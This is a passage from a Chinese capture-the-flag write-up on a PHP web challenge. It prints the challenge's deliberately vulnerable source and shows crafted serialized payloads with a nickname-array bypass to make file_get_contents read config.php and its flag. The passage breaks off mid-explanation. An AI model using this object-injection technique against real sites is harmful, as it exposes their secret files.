class="token delimiter">&lt;?php</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Login First'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$profile</span>  <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: update.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token delimiter">&lt;?php</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>class.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">user</span> <span class="token keyword">extends</span> <span class="token class-name">mysql</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string">'users'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_exists</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value_list</span> <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$object</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">profile</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">mysql</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"SET sql_mode='strict_all_tables'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">,</span> <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT $ret FROM $table WHERE $where"</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">mysql_fetch_object</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$key_list</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string">'\''</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'\',\''</span><span class="token punctuation">,</span> <span class="token variable">$value_list</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'\''</span><span class="token punctuation">;</span>         <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO $table ($key) VALUES ($value)"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE $table SET $key = '$value' WHERE $where"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span>        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>config.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>看最后一个config.php中包含flag，题目要求应该是要我们config.php文件，寻找利用点</p><p>在profile.php中看到有一行代码：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>明显的文件读取操作，而在代码上发现有一个反序列化操作</p><pre class=" language-php"><code class="language-php"><span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>找到<code>$profile</code>的定义</p><pre class=" language-php"><code class="language-php"><span class="token variable">$profile</span><span class="token operator">=</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>跟进<code>show_profile</code>函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$object</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">profile</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>存在一个对数据库的查询操作，于是寻找数据库写入操作</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在找到引用过这个函数的代码，在update.php中</p><pre class=" language-php"><code class="language-php"><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可看到存在序列化操作，至此关系以及理清楚</p><p>通过对<code>$profile</code>传入序列化后的字符串再绕过阻碍达到利用<code>file_get_contents</code>读取文件的操作</p><p>再细看代码：</p><pre class=" language-php"><code class="language-php"><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>$profile是这样定义的结合上面的读取文件操作可知其中的photo变量如果控制令其为config.php即可读取到flag，于是初步payload：</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"aaa"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string">"upload/0cc175b9c0f1b6a831c399e269772661"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>反序列化只反到第一个<code>}</code>结束，后面的自动丢弃，但是photo似乎不是我们能够直接控制的，源码中<code>photo= &#39;upload/&#39; . md5($file[&#39;name&#39;]);</code>，也就是说我们不能直接更改photo中的内容了，于是就需要找到序列化后的其它可利用参数再其后写上<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，达到修改的效果，phone，email，nickname都是我们可控的，而phone和email经过了严格的过滤（详情看上面的update.php源码），再来看看nickname：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>nickname[]</code>数组绕过<code>preg_match</code>和<code>strlen</code>即可，两边判断均为<code>false</code>，故不会执行if中的语句，于是再构造payload：</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"aaa"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">39</span><span class="token punctuation">:</span><span class="token string">"upload/0cc175b9c0f1b6a831c399e269772661"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>到这里是否就已经可以成功读取到文件了呢？并非如此，如果要进行如上的操作，就需要给<code>nickname[]</code>传<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>这样的一个值，传入后将会是这个样子</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token 